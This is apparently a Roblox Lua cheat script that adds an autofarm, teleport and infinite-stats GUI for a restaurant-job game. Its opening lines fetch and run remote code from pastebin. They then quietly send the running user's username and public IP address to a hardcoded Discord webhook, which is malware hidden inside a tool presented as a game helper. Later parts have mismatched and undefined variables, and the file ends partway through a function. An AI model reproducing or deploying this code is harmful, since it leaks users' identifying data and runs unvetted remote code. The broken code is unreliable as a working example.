--[[
      This File has been automatically renamed by @vyxonq for better readability.
      (Always verify before using)
]]

local httpResult, httpBody = pcall(function()

    return game:HttpGet("https://raw.githubusercontent.com/vermingov/UY-Scripts/refs/heads/main/unknown.dat")
end)
if not httpResult or httpBody:gsub("%s+", "") ~= "HN8F28N82FN98N234239FJ023HF723HF7892H387F23HF098J" then
    game:GetService("Players").LocalPlayer:Kick("Unauthorized")
    return
end
loadstring(game:HttpGet("https://pastebin.com/raw/09UVzWme"))()
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")
local getConnections = getconnections or get_signal_cons
if getConnections then
    for i, connection in pairs(getConnections(Players.LocalPlayer.Idled)) do
        if connection.Disable then
            connection.Disable(connection)
        elseif connection.Disconnect then
            connection.Disconnect(connection)
        end
    end
end
local playerIdleConnection = Players.LocalPlayer.Idled:Connect(function()

    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
    VirtualUser:SetKeyDown("w")
    task.wait(0.1)
    VirtualUser:SetKeyUp("w")
end)
task.spawn(function()

    while task.wait(10) do
        VirtualUser:CaptureController()
        VirtualUser:Button2Down(Vector2.new(), workspace.CurrentCamera.CFrame)
        task.wait(0.1)
        VirtualUser:Button2Up(Vector2.new(), workspace.CurrentCamera.CFrame)
    end
end)
local runServiceConnection = game:GetService("RunService").Heartbeat:Connect(function()

    if tick() % 600 < 1 then
        for i = 1, 5, 1 do
            game:GetService("Debris"):AddItem(Instance.new("Frame"), 0)
        end
        collectgarbage("collect")
        game:GetService("ContentProvider"):PreloadAsync({})
    end
end)
local webhookData = {
    content = "Script executed by " .. game.Players.LocalPlayer.Name .. " at " .. os.date("%Y-%m-%d %H:%M:%S")
}
local webhookResult, webhookError = pcall(function()

    local requestFunction = syn
    if requestFunction then
        requestFunction = syn.request
        if not requestFunction then

            requestFunction = http
            if requestFunction then
                requestFunction = http.request
                if not requestFunction then

                    requestFunction = http_request
                    if not requestFunction then
                        requestFunction = fluxus
                        if requestFunction then
                            requestFunction = fluxus.request or getgenv().request or request
                        else

                        end
                    end
                end
            else

            end
        end
    else

    end
    if requestFunction then
        local ipInfo = requestFunction({
            Url = "https://api.ipify.org",
            Method = "GET"
        })
        if ipInfo and ipInfo.Body then
            webhookData.content = webhookData.content .. "\nIP: " .. ipInfo.Body
        end
        requestFunction({
            Url = "https://discord.com/api/webhooks/1362240062166798418/LDBxsSMOc3XBx5tNFB_7FXPltfccP3hXJYX51ga7_PE-XaU5pvG4qmWwPOp1FABsN1wg",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(webhookData)
        })
    else
        warn("HTTP request function not found")
    end
end)
if not webhookResult then
    warn("Failed to send webhook notification: " .. tostring(webhookError))
end
local FarmingGui = Instance.new("ScreenGui")
FarmingGui.Name = "FarmingGUI"
FarmingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
FarmingGui.ResetOnSpawn = false
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 200, 0, 350)
MainFrame.Position = UDim2.new(0.8, 0, 0.5, -175)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = FarmingGui
local MainFrameCorner = Instance.new("UICorner")
MainFrameCorner.CornerRadius = UDim.new(0, 8)
MainFrameCorner.Parent = MainFrame
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(1, 0, 0, 40)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "TNB"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextSize = 25
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.Parent = MainFrame
local SubtitleLabel = Instance.new("TextLabel")
SubtitleLabel.Name = "Subtitle"
SubtitleLabel.Size = UDim2.new(1, 0, 0, 20)
SubtitleLabel.Position = UDim2.new(0, 0, 0.6, 0)
SubtitleLabel.BackgroundTransparency = 1
SubtitleLabel.Text = "Made by vermin"
SubtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
SubtitleLabel.TextSize = 14
SubtitleLabel.Font = Enum.Font.Gotham
SubtitleLabel.Parent = TitleLabel
local AutofarmTabButton = Instance.new("TextButton")
AutofarmTabButton.Name = "AutofarmTab"
AutofarmTabButton.Size = UDim2.new(0.23, 0, 0, 30)
AutofarmTabButton.Position = UDim2.new(0.02, 0, 0, 45)
AutofarmTabButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
AutofarmTabButton.Text = "Autofarm"
AutofarmTabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
AutofarmTabButton.Font = Enum.Font.Gotham
AutofarmTabButton.Parent = MainFrame
local OtherTabButton = Instance.new("TextButton")
OtherTabButton.Name = "OtherTab"
OtherTabButton.Size = UDim2.new(0.23, 0, 0, 30)
OtherTabButton.Position = UDim2.new(0.27, 0, 0, 45)
OtherTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
OtherTabButton.Text = "Other"
OtherTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
OtherTabButton.Font = Enum.Font.Gotham
OtherTabButton.Parent = MainFrame
local TeleportsTabButton = Instance.new("TextButton")
TeleportsTabButton.Name = "TeleportsTab"
TeleportsTabButton.Size = UDim2.new(0.23, 0, 0, 30)
TeleportsTabButton.Position = UDim2.new(0.52, 0, 0, 45)
TeleportsTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
TeleportsTabButton.Text = "Teleports"
TeleportsTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
TeleportsTabButton.Font = Enum.Font.Gotham
TeleportsTabButton.Parent = MainFrame
local ExtraTabButton = Instance.new("TextButton")
ExtraTabButton.Name = "ExtraTab"
ExtraTabButton.Size = UDim2.new(0.23, 0, 0, 30)
ExtraTabButton.Position = UDim2.new(0.77, 0, 0, 45)
ExtraTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ExtraTabButton.Text = "Extra"
ExtraTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
ExtraTabButton.Font = Enum.Font.Gotham
ExtraTabButton.Parent = MainFrame
local AutofarmFrame = Instance.new("Frame")
AutofarmFrame.Name = "AutofarmFrame"
AutofarmFrame.Size = UDim2.new(1, 0, 0, 220)
AutofarmFrame.Position = UDim2.new(0, 0, 0, 85)
AutofarmFrame.BackgroundTransparency = 1
AutofarmFrame.Visible = true
AutofarmFrame.Parent = MainFrame
local OtherFrame = Instance.new("Frame")
OtherFrame.Name = "OtherFrame"
OtherFrame.Size = UDim2.new(1, 0, 0, 220)
OtherFrame.Position = UDim2.new(0, 0, 0, 85)
OtherFrame.BackgroundTransparency = 1
OtherFrame.Visible = false
OtherFrame.Parent = MainFrame
local TeleportsFrame = Instance.new("Frame")
TeleportsFrame.Name = "TeleportsFrame"
TeleportsFrame.Size = UDim2.new(1, 0, 0, 220)
TeleportsFrame.Position = UDim2.new(0, 0, 0, 85)
TeleportsFrame.BackgroundTransparency = 1
TeleportsFrame.Visible = false
TeleportsFrame.Parent = MainFrame
local ExtraFrame = Instance.new("Frame")
ExtraFrame.Name = "ExtraFrame"
ExtraFrame.Size = UDim2.new(1, 0, 0, 220)
ExtraFrame.Position = UDim2.new(0, 0, 0, 85)
ExtraFrame.BackgroundTransparency = 1
ExtraFrame.Visible = false
ExtraFrame.Parent = MainFrame
local function createToggleButton(buttonName, positionY, parentFrame)

    local buttonFrame = Instance.new("Frame")
    buttonFrame.Name = buttonName .. "Frame"
    buttonFrame.Size = UDim2.new(0.9, 0, 0, 35)
    buttonFrame.Position = UDim2.new(0.05, 0, 0, positionY)
    buttonFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    buttonFrame.BorderSizePixel = 0
    buttonFrame.Parent = parentFrame
    local buttonFrameCorner = Instance.new("UICorner")
    buttonFrameCorner.CornerRadius = UDim.new(0, 6)
    buttonFrameCorner.Parent = buttonFrame
    local button = Instance.new("TextButton")
    button.Name = buttonName
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Text = buttonName
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 14
    button.Font = Enum.Font.Gotham
    button.Parent = buttonFrame
    local statusIndicator = Instance.new("Frame")
    statusIndicator.Name = "Status"
    statusIndicator.Size = UDim2.new(0, 12, 0, 12)
    statusIndicator.Position = UDim2.new(0.9, 0, 0.5, -6)
    statusIndicator.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    statusIndicator.BorderSizePixel = 0
    statusIndicator.Parent = buttonFrame
    local statusIndicatorCorner = Instance.new("UICorner")
    statusIndicatorCorner.CornerRadius = UDim.new(1, 0)
    statusIndicatorCorner.Parent = statusIndicator
    return button, statusIndicator
end
local function createButton(buttonName, positionY, parentFrame)

    local buttonFrame = Instance.new("Frame")
    buttonFrame.Name = buttonName .. "Frame"
    buttonFrame.Size = UDim2.new(0.9, 0, 0, 35)
    buttonFrame.Position = UDim2.new(0.05, 0, 0, positionY)
    buttonFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    buttonFrame.BorderSizePixel = 0
    buttonFrame.Parent = parentFrame
    local buttonFrameCorner = Instance.new("UICorner")
    buttonFrameCorner.CornerRadius = UDim.new(0, 6)
    buttonFrameCorner.Parent = buttonFrame
    local button = Instance.new("TextButton")
    button.Name = buttonName
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Text = buttonName
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 14
    button.Font = Enum.Font.Gotham
    button.Parent = buttonFrame
    return button
end
local function createTextBox(textBoxName, positionY, parentFrame)

    local textBoxFrame = Instance.new("Frame")
    textBoxFrame.Name = textBoxName .. "Frame"
    textBoxFrame.Size = UDim2.new(0.9, 0, 0, 25)
    textBoxFrame.Position = UDim2.new(0.05, 0, 0, positionY)
    textBoxFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    textBoxFrame.BorderSizePixel = 0
    textBoxFrame.Parent = parentFrame
    local textBoxFrameCorner = Instance.new("UICorner")
    textBoxFrameCorner.CornerRadius = UDim.new(0, 6)
    textBoxFrameCorner.Parent = textBoxFrame
    local textBox = Instance.new("TextBox")
    textBox.Name = textBoxName
    textBox.Size = UDim2.new(1, 0, 1, 0)
    textBox.BackgroundTransparency = 1
    textBox.Text = textBoxName
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.TextSize = 14
    textBox.Font = Enum.Font.Gotham
    textBox.Parent = textBoxFrame
    textBox.PlaceholderText = textBoxName
    textBox.ClearTextOnFocus = true
    return textBox
end
local shelfAutofarmButton, shelfAutofarmStatus = createToggleButton("ShelfAutofarm", 10, AutofarmFrame)
local dishAutofarmButton, dishAutofarmStatus = createToggleButton("DishAutofarm", 55, AutofarmFrame)
local cheffAutofarmButton, cheffAutofarmStatus = createToggleButton("CheffAutofarm", 100, AutofarmFrame)
local infiniteStaminaButton, infiniteStaminaStatus = createToggleButton("Infinite Stamina", 10, OtherFrame)
local infiniteHungerButton, infiniteHungerStatus = createToggleButton("Infinite Hunger", 55, OtherFrame)
local infiniteSleepButton, infiniteSleepStatus = createToggleButton("Infinite Sleep", 100, OtherFrame)
local shelfJobButton = createButton("ShelfJob", 10, TeleportsFrame)
local knifeDealerButton = createButton("KnifeDealer", 55, TeleportsFrame)
local dishJobButton = createButton("DishJob", 100, TeleportsFrame)
local cheffJobButton = createButton("CheffJob", 145, TeleportsFrame)
local joinSmallServerButton = createButton("Join Small Server", 10, ExtraFrame)
local autoClaimGiftsButton, autoClaimGiftsStatus = createToggleButton("Auto Claim Gifts", 55, ExtraFrame)
local webhookIntegrationButton, webhookIntegrationStatus = createToggleButton("Webhook Integration", 100, ExtraFrame)
local webhookURLTextBox = createTextBox("Webhook URL", 140, ExtraFrame)
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0.9, 0, 0, 35)
CloseButton.Position = UDim2.new(0.05, 0, 0.85, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseButton.BorderSizePixel = 0
CloseButton.Text = "Close GUI"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 14
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = MainFrame
local CloseButtonCorner = Instance.new("UICorner")
CloseButtonCorner.CornerRadius = UDim.new(0, 6)
CloseButtonCorner.Parent = CloseButton
local UserInputService = game:GetService("UserInputService")
local isDragging = nil
local currentMousePosition = nil
local initialFramePosition = nil
local inputChangedConnection = nil
MainFrame.InputBegan:Connect(function(inputObject)

    if inputObject.UserInputType == Enum.UserInputType.MouseButton1 or inputObject.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        initialFramePosition = MainFrame.Position
        currentMousePosition = inputObject.Position
        inputObject.Changed:Connect(function()

            if inputObject.UserInputState == Enum.UserInputState.End then
                isDragging = false
            end
        end)
    end
end)
MainFrame.InputChanged:Connect(function(inputObject)

    if inputObject.UserInputType == Enum.UserInputType.MouseMovement or inputObject.UserInputType == Enum.UserInputType.Touch then
        inputChangedConnection = inputObject
    end
end)
UserInputService.InputChanged:Connect(function(inputObject)

    if inputObject == inputChangedConnection and isDragging then
        local positionDelta = inputObject.Position - currentMousePosition
        MainFrame.Position = UDim2.new(initialFramePosition.X.Scale, initialFramePosition.X.Offset + positionDelta.X, initialFramePosition.Y.Scale, initialFramePosition.Y.Offset + positionDelta.Y)
    end
end)
AutofarmTabButton.MouseButton1Click:Connect(function()

    AutofarmTabButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    AutofarmTabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    OtherTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    OtherTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    TeleportsTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    TeleportsTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    ExtraTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    ExtraTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    AutofarmFrame.Visible = true
    OtherFrame.Visible = false
    TeleportsFrame.Visible = false
    ExtraFrame.Visible = false
end)
OtherTabButton.MouseButton1Click:Connect(function()

    OtherTabButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    OtherTabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    AutofarmTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    AutofarmTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    TeleportsTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    TeleportsTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    ExtraTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    ExtraTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    OtherFrame.Visible = true
    AutofarmFrame.Visible = false
    TeleportsFrame.Visible = false
    ExtraFrame.Visible = false
end)
TeleportsTabButton.MouseButton1Click:Connect(function()

    TeleportsTabButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    TeleportsTabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    AutofarmTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    AutofarmTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    OtherTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    OtherTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    ExtraTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    ExtraTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    TeleportsFrame.Visible = true
    AutofarmFrame.Visible = false
    OtherFrame.Visible = false
    ExtraFrame.Visible = false
end)
ExtraTabButton.MouseButton1Click:Connect(function()

    ExtraTabButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    ExtraTabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    AutofarmTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    AutofarmTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    OtherTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    OtherTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    TeleportsTabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    TeleportsTabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    ExtraFrame.Visible = true
    AutofarmFrame.Visible = false
    OtherFrame.Visible = false
    TeleportsFrame.Visible = false
end)
local autoClaimGiftsEnabled = false
autoClaimGiftsButton.MouseButton1Click:Connect(function()

    autoClaimGiftsEnabled = not autoClaimGiftsEnabled
    local statusButton = autoClaimGiftsStatus
    local isEnabled = autoClaimGiftsEnabled
    if isEnabled then
        isEnabled = Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
    else

    end
    statusButton.BackgroundColor3 = isEnabled
    while autoClaimGiftsEnabled do
        for i = 1, 9, 1 do
            game:GetService("ReplicatedStorage"):WaitForChild("GiftFolder"):WaitForChild("ClaimGift"):InvokeServer(
                unpack({
                    [1] = i
                }))
        end
        task.wait(1)
    end
end)
local webhookIntegrationEnabled = false
local webhookConnection = nil
webhookIntegrationButton.MouseButton1Click:Connect(function()

    webhookIntegrationEnabled = not webhookIntegrationEnabled
    local statusButton = webhookIntegrationStatus
    local isEnabled = webhookIntegrationEnabled
    if isEnabled then
        isEnabled = Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
    else

    end
    statusButton.BackgroundColor3 = isEnabled
    isEnabled = webhookIntegrationEnabled
    if isEnabled then
        isEnabled = webhookURLTextBox.Text
        if isEnabled == "" then
            webhookIntegrationEnabled = false
            webhookIntegrationStatus.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            return
        end
        local initialWebhookMessage = {
            content = "",
            embeds = {{
                title = "Webhook Integration Enabled",
                description = string.format("Webhook integration enabled on account: %s", game.Players.LocalPlayer.Name),
                color = 65280
            }}
        }
        local webhookHeaders = {
            ["content-type"] = "application/json"
        }
        request({
            Url = isEnabled,
            Method = "POST",
            Headers = webhookHeaders,
            Body = game:GetService("HttpService"):JSONEncode(initialWebhookMessage)
        })
        local lastCrateLevel = game.Players.LocalPlayer.Stats.CrateLevel.Value
        local lastDishwasherLevel = game.Players.LocalPlayer.Stats.DishwasherLevel.Value
        local function checkNearbyPlayers()

            if not webhookIntegrationEnabled then
                return
            end
            local LocalPlayer = game.Players.LocalPlayer
            local Character = LocalPlayer.Character
            if not Character then
                return
            end
            local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
            if not HumanoidRootPart then
                return
            end
            print("Checking for nearby players...")
            for _, player in pairs(game.Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local playerCharacter = player.Character
                    if playerCharacter then
                        local playerRootPart = playerCharacter:FindFirstChild("HumanoidRootPart")
                        if playerRootPart then
                            local distance = (playerRootPart.Position - HumanoidRootPart.Position).Magnitude
                            print(string.format("Distance to %s: %d studs", player.Name, math.floor(distance)))
                            if distance <= 20 then
                                local playerNearbyMessage = {
                                    content = "@everyone",
                                    embeds = {{
                                        title = "Player Nearby!",
                                        description = string.format("Player %s is %d studs away from you!", player.Name,
                                            math.floor(distance)),
                                        color = 16776960
                                    }}
                                }
                                local success, errorMsg = pcall(function()

                                    return request({
                                        Url = isEnabled,
                                        Method = "POST",
                                        Headers = webhookHeaders,
                                        Body = game:GetService("HttpService"):JSONEncode(playerNearbyMessage)
                                    })
                                end)
                                if success then
                                    print("Webhook sent successfully")
                                else
                                    print("Webhook failed:", errorMsg)
                                end

                            end
                        end
                    end
                end
            end
        end
        spawn(function()

            while webhookIntegrationEnabled do
                checkNearbyPlayers()
                task.wait(2)
            end
        end)
        webhookConnection = game.Players.LocalPlayer.Stats.CrateLevel.Changed:Connect(function(newCrateLevel)

            if not webhookIntegrationEnabled then
                webhookConnection:Disconnect()
                webhookConnection = nil
                return
            end
            if lastCrateLevel < newCrateLevel then
                request({
                    Url = isEnabled,
                    Method = "POST",
                    Headers = {
                        ["content-type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        content = "",
                        embeds = {{
                            title = "Crate Level Up!",
                            description = string.format("Your crate level increased from %d to %d!", lastCrateLevel, newCrateLevel),
                            color = 65280
                        }}
                    })
                })
                lastCrateLevel = newCrateLevel
            end
        end)
        local chefLevelChangedConnection = game.Players.LocalPlayer.Stats.CheffLevel.Changed:Connect(function(newChefLevel)

            if not webhookIntegrationEnabled then
                chefLevelChangedConnection:Disconnect()
                return
            end
            if lastChefLevel < newChefLevel then
                request({
                    Url = isEnabled,
                    Method = "POST",
                    Headers = {
                        ["content-type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        content = "",
embeds = {{
                            title = "Chef Level Up!",
                            description = string.format("Your chef level increased from %d to %d!", lastChefLevel, currentChefLevel),
                            color = 65280
                        }}
                    })
                })
                lastChefLevel = currentChefLevel
            end
        end)
        local dishwasherLevelChangedConnection = game.Players.LocalPlayer.Stats.DishwasherLevel.Changed:Connect(function(newDishwasherLevel)

            if not isScriptEnabled then
                dishwasherConnection:Disconnect()
                return
            end
            if currentDishwasherLevel < newDishwasherLevel then
                request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {
                        ["content-type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        content = "",
                        embeds = {{
                            title = "Dishwasher Level Up!",
                            description = string.format("Your dishwasher level increased from %d to %d!", currentDishwasherLevel, newDishwasherLevel),
                            color = 65280
                        }}
                    })
                })
                currentDishwasherLevel = newDishwasherLevel
            end
        end)
        game:GetService("ScriptContext").Error:Connect(function()

            if isScriptEnabled then
                request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = webhookHeaders,
                    Body = game:GetService("HttpService"):JSONEncode({
                        content = "",
                        embeds = {{
                            title = "Player Disconnected",
                            description = string.format("Account %s has been disconnected from the game",
                                game.Players.LocalPlayer.Name),
                            color = 16711680
                        }}
                    })
                })
            end
        end)
        game.Players.LocalPlayer.PlayerRemoving:Connect(function()

            if isScriptEnabled then
                request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = webhookHeaders,
                    Body = game:GetService("HttpService"):JSONEncode({
                        content = "",
                        embeds = {{
                            title = "Player Disconnected",
                            description = string.format("Account %s has been disconnected from the game",
                                game.Players.LocalPlayer.Name),
                            color = 16711680
                        }}
                    })
                })
            end
        end)

    else
        webhookUrl = initialWebhookUrl
        if webhookUrl then
            webhookUrl = initialWebhookUrl
            webhookUrl:Disconnect()
            webhookUrl = nil
            initialWebhookUrl = webhookUrl
        end
    end
end)
chefAutofarmButton.MouseButton1Click:Connect(function()

    chefAutofarm = not chefAutofarm
    local button = chefAutofarmButton
    local isEnabled = chefAutofarm
    if isEnabled then
        isEnabled = Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
    else

    end
    button.BackgroundColor3 = isEnabled
    local tweenService = game:GetService("TweenService")
    local localPlayer = game.Players.LocalPlayer
    local character = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
    local targetPosition = Vector3.new(294, 3, 746)
    local moveTween = tweenService:Create(character, TweenInfo.new(((targetPosition - character.Position)).Magnitude / 30), {
        CFrame = CFrame.new(targetPosition)
    })
    moveTween:Play()
    moveTween.Completed:Wait()
    local shouldRunChefFarm = chefAutofarm
    if shouldRunChefFarm then
        local function performChefActions()

            local tweenService = game:GetService("TweenService")
            local localPlayer = game.Players.LocalPlayer
            local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local storageRoomPrompt = workspace.CheffJob.StorageRoom.Part.ProximityPrompt
            local fryingSoundPrompt = workspace.CheffJob.Cooking.Pan.fryingsound.pan.ProximityPrompt
            local servePrompt = workspace.CheffJob.Serve.Table2.Model.Serve.ProximityPrompt
            local verticalOffset = -5
            local function setAnchored(isAnchored)

                humanoidRootPart.Anchored = isAnchored
            end
            setAnchored(false)
            local goToStoragePosition = Vector3.new(307, 3 + verticalOffset, 748)
            local moveTweenToStorage = tweenService:Create(humanoidRootPart, TweenInfo.new(((goToStoragePosition - humanoidRootPart.Position)).Magnitude / 30), {
                CFrame = CFrame.new(goToStoragePosition)
            })
            moveTweenToStorage:Play()
            moveTweenToStorage.Completed:Wait()
            setAnchored(true)
            local steakCount = 0
            while true do
                fireproximityprompt(storageRoomPrompt)
                wait(1)
                if 5 <= steakCount + 1 and not character:FindFirstChild("UncookedSteak") then
                    setAnchored(false)
                    local returnToInitialPosition = tweenService:Create(humanoidRootPart, TweenInfo.new(0.5), {
                        CFrame = CFrame.new(Vector3.new(307, 3, 748))
                    })
                    returnToInitialPosition:Play()
                    returnToInitialPosition.Completed:Wait()
                    wait(5)
                    fireproximityprompt(storageRoomPrompt)
                    wait(1)
                    if not character:FindFirstChild("UncookedSteak") then
                        local returnToOffsetPosition = tweenService:Create(humanoidRootPart, TweenInfo.new(0.5), {
                            CFrame = CFrame.new(Vector3.new(307, 3 + verticalOffset, 748))
                        })
                        returnToOffsetPosition:Play()
                        returnToOffsetPosition.Completed:Wait()
                        setAnchored(true)
                        steakCount = 0
                    end
                end
                if not character:FindFirstChild("UncookedSteak") and chefAutofarm then

                else
                    break
                end
            end
            if not chefAutofarm then
                setAnchored(false)
                return
            end
            setAnchored(false)
            local goToCookPosition = Vector3.new(297, 3 + verticalOffset, 773)
            moveTweenToStorage = tweenService:Create(humanoidRootPart, TweenInfo.new(((goToCookPosition - humanoidRootPart.Position)).Magnitude / 30), {
                CFrame = CFrame.new(goToCookPosition)
            })
            moveTweenToStorage:Play()
            moveTweenToStorage.Completed:Wait()
            setAnchored(true)
            local cookTime = 0
            while true do
                fireproximityprompt(fryingSoundPrompt)
                wait(1)
                if cookTime + 1 >= 5 then
                    local uncookedSteak = character:FindFirstChild("UncookedSteak")
                    if uncookedSteak then
                        setAnchored(false)
                        local goToPanPosition = Vector3.new(297, 3, 773)
                        local moveTweenToPan = tweenService:Create(humanoidRootPart, TweenInfo.new(0.5), {
                            CFrame = CFrame.new(goToPanPosition)
                        })
                        moveTweenToPan:Play()
                        moveTweenToPan.Completed:Wait()
                        wait(5)
                        fireproximityprompt(fryingSoundPrompt)
                        wait(1)
                        local anotherUncookedSteak = character:FindFirstChild("UncookedSteak")
                        if anotherUncookedSteak then
                            anotherUncookedSteak = Vector3.new(297, 3 + verticalOffset, 773)
                            local moveTweenBackToOffset = tweenService:Create(humanoidRootPart, TweenInfo.new(0.5), {
                                CFrame = CFrame.new(anotherUncookedSteak)
                            })
                            moveTweenBackToOffset:Play()
                            moveTweenBackToOffset.Completed:Wait()
                            setAnchored(true)
                            cookTime = 0
                        end
                    end
                end
                local foundUncookedSteak = character:FindFirstChild("UncookedSteak")
                if foundUncookedSteak then
                    local isChefAutofarmEnabled = chefAutofarm
                    if not isChefAutofarmEnabled then
                        break
                    end
                else
                    break
                end
            end
            if not chefAutofarm then
                setAnchored(false)
                return
            end
            while true do
                wait()
                if not character:FindFirstChild("CookedSteak") then
                    local isChefAutofarmEnabled = chefAutofarm
                    if not isChefAutofarmEnabled then
                        break
                    end
                else
                    break
                end
            end
            if not chefAutofarm then
                setAnchored(false)
                return
            end
            setAnchored(false)
            local goToServePosition = Vector3.new(273, 3 + verticalOffset, 760)
            moveTweenToStorage = tweenService:Create(humanoidRootPart, TweenInfo.new(((goToServePosition - humanoidRootPart.Position)).Magnitude / 30), {
                CFrame = CFrame.new(goToServePosition)
            })
            moveTweenToStorage:Play()
            moveTweenToStorage.Completed:Wait()
            setAnchored(true)
            local serveTime = 0
            while true do
                fireproximityprompt(servePrompt)
                wait(1)
                if 5 <= serveTime + 1 and character:FindFirstChild("CookedSteak") then
                    setAnchored(false)
                    local returnToServePosition = Vector3.new(273, 3, 760)
                    local serveTweenInfo = TweenInfo.new(0.5)
                    local moveTweenToServe = tweenService:Create(humanoidRootPart, serveTweenInfo, {
                        CFrame = CFrame.new(returnToServePosition)
                    })
                    moveTweenToServe:Play()
                    moveTweenToServe.Completed:Wait()
                    wait(5)
                    fireproximityprompt(servePrompt)
                    wait(1)
                    local foundCookedSteak = character:FindFirstChild("CookedSteak")
                    if foundCookedSteak then
                        foundCookedSteak = Vector3.new(273, 3 + verticalOffset, 760)
                        serveTweenInfo = TweenInfo.new(0.5)
                        moveTweenToServe = tweenService:Create(humanoidRootPart, serveTweenInfo, {
                            CFrame = CFrame.new(foundCookedSteak)
                        })
                        moveTweenToServe:Play()
                        moveTweenToServe.Completed:Wait()
                        setAnchored(true)
                        serveTime = 0
                    end
                end
                if character:FindFirstChild("CookedSteak") and chefAutofarm then

                else
                    break
                end
            end
            if not chefAutofarm then
                setAnchored(false)
                return
            end
            wait(1)
        end
        performChefActions()
        coroutine.wrap(function()

            while chefAutofarm do
                performChefActions()
                wait()
            end
        end)()

    else
        local player = game
        player = player.Players
        player = player.LocalPlayer
        player = player.Character
        if player then
            local humanoidRootPart = player:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                humanoidRootPart.Anchored = false
            end
        end
    end
end)
dishwasherAutofarmButton.MouseButton1Click:Connect(function()

    dishAutofarm = not dishAutofarm
    local button = dishwasherAutofarmButton
    local isEnabled = dishAutofarm
    if isEnabled then
        isEnabled = Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
    else

    end
